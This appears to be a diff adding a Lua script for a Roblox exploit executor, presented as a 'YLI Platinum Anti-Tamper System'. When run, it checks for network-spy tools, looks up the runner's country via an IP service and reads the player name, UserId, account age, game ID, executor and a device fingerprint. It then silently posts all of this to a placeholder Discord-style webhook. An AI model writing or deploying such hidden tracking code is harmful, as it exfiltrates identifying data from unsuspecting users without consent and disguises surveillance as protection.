@@ -1,0 +1,46 @@
+local p = game.Players.LocalPlayer
+local h = game:GetService("HttpService")
+local logURL = "你的_WEBHOOK_網址"
+
+-- 1. 偵測環境安全度
+local isSpyDetected = "安全"
+if game:GetService("CoreGui"):FindFirstChild("HttpSpy") or game:GetService("CoreGui"):FindFirstChild("SimpleSpy") then
+    isSpyDetected = "⚠️ 偵測到 Spy 工具！"
+end
+
+-- 2. 獲取公網 IP 與 地區 (選配，需開啟 HttpSpy 可能會抓到)
+local ipInfo = "Loading..."
+pcall(function()
+    ipInfo = h:JSONDecode(game:HttpGet("http://ip-api.com/json")).country or "Unknown"
+end)
+
+-- 3. 獲取執行器等級
+local executor = (identifyexecutor and identifyexecutor()) or "Unknown"
+
+local data = {
+    ["embeds"] = {{
+        ["title"] = "🔥 **厭璃 (YLI) 至尊版 - 深度監控報告**",
+        ["color"] = (isSpyDetected == "安全") and 0x00FF00 or 0xFF0000, -- 安全綠 / 警告紅
+        ["fields"] = {
+            {["name"] = "👤 玩家", ["value"] = p.Name.." ("..p.UserId..")", ["inline"] = true},
+            {["name"] = "🛡️ 安全狀態", ["value"] = isSpyDetected, ["inline"] = true},
+            {["name"] = "📅 帳號創立", ["value"] = p.AccountAge.." 天", ["inline"] = true},
+            {["name"] = "🌍 登入地區", ["value"] = ipInfo, ["inline"] = true},
+            {["name"] = "💻 執行器", ["value"] = executor, ["inline"] = true},
+            {["name"] = "🎮 遊戲 PlaceID", ["value"] = tostring(game.PlaceId), ["inline"] = true},
+            {["name"] = "🔑 設備指紋 (HWID)", ["value"] = "||"..game:GetService("RbxAnalyticsService"):GetClientId().."||", ["inline"] = false},
+            {["name"] = "🕒 執行時間", ["value"] = os.date("%Y-%m-%d %H:%M:%S"), ["inline"] = false}
+        },
+        ["footer"] = {["text"] = "YLI Platinum Anti-Tamper System"},
+    }}
+}
+
+-- 執行發送
+pcall(function()
+    request({
+        Url = logURL,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = h:JSONEncode(data)
+    })
+end)
